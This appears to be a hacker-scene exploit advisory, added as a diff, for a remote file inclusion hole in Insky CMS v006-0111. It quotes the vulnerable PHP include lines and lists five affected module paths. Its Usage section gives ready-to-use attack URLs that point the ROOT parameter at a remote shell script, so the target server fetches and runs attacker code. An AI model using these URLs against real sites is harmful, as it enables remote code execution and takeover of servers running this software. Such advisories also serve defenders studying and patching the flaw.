@@ -1,0 +1,42 @@
+        \\\|///
+      \\  - -  //
+       (  @ @ )
+----oOOo--(_)-oOOo--------------------------------------------------
+Insky CMS v006-0111 Multiple Remote File Include Vulnerability
+Script: http://code.google.com/p/insky/downloads/list
+Author: mat
+Mail: rahmat_punk@hotmail.com
+---------------Ooooo------------------------------------------------
+               (   )
+      ooooO     ) /
+      (   )    (_/
+       \ (
+        \_)
+
+Vuln Code 
+
+<?...
+  require_once $ROOT."/insky/class/ext/js/class.js.php";
+...?>
+
+          (insky/modules/city.get/city.get.php)
+          (insky/modules/city.get/index.php)
+          (insky/modules/message2.send/message.send.php)
+          (insky/modules/message.send/message.send.php)
+
+
+<?...
+  require_once($ROOT."/insky/class/ext/wiki/parserutils.php");
+  require_once($ROOT.'/insky/wysiwyg/config.php');
+  require_once($ROOT.'/insky/wysiwyg/editor_class.php');
+...?>
+
+          (insky/modules/pages.add/pages.add.php)
+
+Usage: http://[target]/[path]/modules/city.get/city.get.php?ROOT=http://[shellscript]
+       http://[target]/[path]/modules/city.get/index.php?ROOT=http://[shellscript]
+       http://[target]/[path]/modules/message2.send/message.send.php?ROOT=http://[shellscript]
+       http://[target]/[path]/modules/message.send/message.send.php?ROOT=http://[shellscript]
+       http://[target]/[path]/modules/pages.add/pages.add.php?ROOT=http://[shellscript]
+
+Greetings: All Hackerz
